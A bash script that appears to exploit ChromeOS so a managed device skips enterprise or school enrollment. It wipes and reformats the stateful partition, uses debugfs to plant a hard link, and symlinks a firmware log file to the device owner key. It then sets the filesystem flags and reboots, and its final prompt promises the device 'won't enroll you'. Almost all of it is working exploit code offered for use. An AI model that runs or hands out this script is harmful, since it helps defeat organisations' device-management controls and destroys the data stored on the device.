#!/bin/bash

stateful="/mnt/stateful_partition"
unencrypted="${stateful}/unencrypted"
preserve="${unencrypted}/preserve"
art="${unencrypted}/art-data"
flog_file="${unencrypted}/preserve/cr50_flog_timestamp"
target="/var/lib/devicesettings/owner.key"

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -d "/dev/$dev_name" 2>/dev/null)" in
				*'name="STATE"'*'name="KERN-A"'*'name="ROOT-A"'*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
} 

disk="$(get_largest_cros_blockdev)"

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
} # taken from sh1mmer

state_dev="$(format_part_number "$disk" 1)"

echo "wiping stateful"
mkfs.ext4 -F -b 4096 -L H-STATE "$state_dev"
mount "$state_dev" "${stateful}"
mkdir -p "${unencrypted}"

echo "placing art-data > preserve hardlink"
mkdir -p "${preserve}"
preserve_inode=$(stat -c '%i' "${preserve}")
debugfs -w "$state_dev" -R "link <${preserve_inode}> unencrypted/art-data"

echo "placing symlink to /var/lib/devicesettings/owner.key"
ln -sf "${target}" "${flog_file}"

echo "art-data inode: $(stat -c '%i' ${art})"
echo "unencrypted inode: $(stat -c '%i' ${unencrypted})"
echo "flog symlink: $(readlink ${flog_file})"
ls -lah "${preserve}"
ls -lah "${art}"
sync

echo "setting flags"
umount "${stateful}" 
debugfs -w -R 'dirty -clean' "$state_dev"
debugfs -w -R 'features -needs_recovery' "$state_dev"

crossystem disable_dev_request=1 2>/dev/null
crossystem disable_dev_request=1

read -rp "press enter to reboot, it'll take you back to verified, go through setup & it won't enroll you"
reboot -f
